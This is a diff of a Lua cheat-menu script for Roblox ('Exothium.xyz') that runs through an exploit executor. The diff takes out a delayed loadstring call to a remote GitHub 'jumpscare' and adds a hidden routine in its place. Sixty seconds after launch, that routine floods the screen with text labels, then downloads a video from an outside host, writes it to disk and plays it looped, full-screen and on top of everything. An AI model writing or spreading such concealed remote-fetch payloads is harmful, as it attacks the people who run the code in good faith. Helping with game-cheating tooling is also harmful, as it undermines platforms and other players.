@@ -1,5 +1,5 @@
 local exec = identifyexecutor()
-local version = "V0.0.3c"
+local version = "V0.0.3b"
 
 local notificationOffset = 45
 local notifications = {}
@@ -3740,5 +3740,48 @@ Notify("Exothium.xyz", "Press Insert to toggle the menu", 3.5)
 
 game.CoreGui.ewq9erdusafeuwufijnen329duewq_1.Enabled = true
 
-wait(180)
-loadstring("https://raw.githubusercontent.com/CilXA/B7FGF5X1AAA33FG/refs/heads/main/jumpscare")()
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local function showHiText()
+    for i = 1, 100 do
+        local TextLabel = Instance.new("TextLabel")
+        TextLabel.Parent = ScreenGui
+        TextLabel.Text = "Nn, No fatality detected :)̲̳͍̍̎̄̅̿̑͒͗͆͊͋͌"
+        TextLabel.Font = Enum.Font.SourceSansBold
+        TextLabel.TextSize = math.random(20, 40)
+        TextLabel.TextColor3 = Color3.new(math.random(), math.random(), math.random())
+        TextLabel.BackgroundTransparency = 1
+        TextLabel.Size = UDim2.new(0, 200, 0, 50)
+        TextLabel.Position = UDim2.new(math.random(), 0, math.random(), 0)
+        task.wait(0.1)
+    end
+end
+
+local function playJumpscare()
+    if not isfile("video.webm") then
+        writefile("video.webm", game:HttpGet("https://api.swimhub.xyz/video.webm"))
+    end
+    if not getcustomasset then return end
+
+    local newVideoFrame = Instance.new("VideoFrame", ScreenGui)
+    newVideoFrame.Visible = false
+    newVideoFrame.Looped = true
+    newVideoFrame.Video = getcustomasset("video.webm")
+    newVideoFrame.Volume = 1
+    newVideoFrame.Size = UDim2.new(1, 0, 1, 0)
+    newVideoFrame.ZIndex = math.huge
+    newVideoFrame.BackgroundTransparency = 1
+
+    repeat task.wait() until newVideoFrame.IsLoaded
+    newVideoFrame.Visible = true
+    newVideoFrame:Play()
+end
+
+task.spawn(function()
+wait(60)
+    showHiText()
+    task.wait(5)
+    playJumpscare()
+end)
+
